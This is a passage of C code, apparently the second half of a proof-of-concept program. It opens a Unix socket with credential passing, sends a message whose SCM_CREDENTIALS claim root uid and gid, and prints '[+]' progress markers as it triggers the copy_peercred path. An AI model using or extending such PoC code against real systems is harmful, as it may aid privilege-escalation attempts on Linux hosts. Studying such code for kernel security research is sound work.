    setsockopt(fd_client, SOL_SOCKET, SO_PASSCRED, &optval, sizeof(optval));

    ret = connect(fd_client, (struct sockaddr *)&addr, sizeof(addr));
    if (ret < 0) { perror("connect"); return 1; }

    fd_accepted = accept(fd_listen, NULL, NULL);
    if (fd_accepted < 0) { perror("accept"); return 1; }

    printf("[+] Connected - copy_peercred called\n");

    /* Send a message with credentials on client */
    char data[] = "hello";
    char cmsg_buf[128];
    struct msghdr msg;
    struct iovec iov;
    unsigned int creds[3];

    /* Set credentials - these must match our real uid/gid, 
     * but we can send pid=0 (current task) */
    creds[0] = 0;  /* pid = 0 means "use current task's pid" */
    creds[1] = 0;  /* uid = 0 (root) */
    creds[2] = 0;  /* gid = 0 (root) */

    memset(&msg, 0, sizeof(msg));
    memset(cmsg_buf, 0, sizeof(cmsg_buf));

    struct cmsghdr *cmsg = (struct cmsghdr *)cmsg_buf;
    cmsg->cmsg_level = SOL_SOCKET;
    cmsg->cmsg_type = SCM_CREDENTIALS;
    cmsg->cmsg_len = CMSG_LEN(12);
    memcpy(CMSG_DATA(cmsg), creds, 12);

    iov.iov_base = data;
    iov.iov_len = 6;

    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;
    msg.msg_control = cmsg;
    msg.msg_controllen = CMSG_SPACE(12);

    ret = sendmsg(fd_client, &msg, 0);
    if (ret < 0) { perror("sendmsg"); }
    else { printf("[+] Sent message with SCM_CREDENTIALS\n"); }

    /* Receive on accepted side */
    char rbuf[64];
    ret = recv(fd_accepted, rbuf, sizeof(rbuf), MSG_CMSG_CLOEXEC);
    if (ret < 0) { perror("recv"); }
    else { printf("[+] Received %d bytes\n", ret); }

    close(fd_accepted);
    close(fd_client);
    close(fd_listen);
    unlink("/tmp/poc.sock");

    printf("[+] Done\n");
    return 0;
}
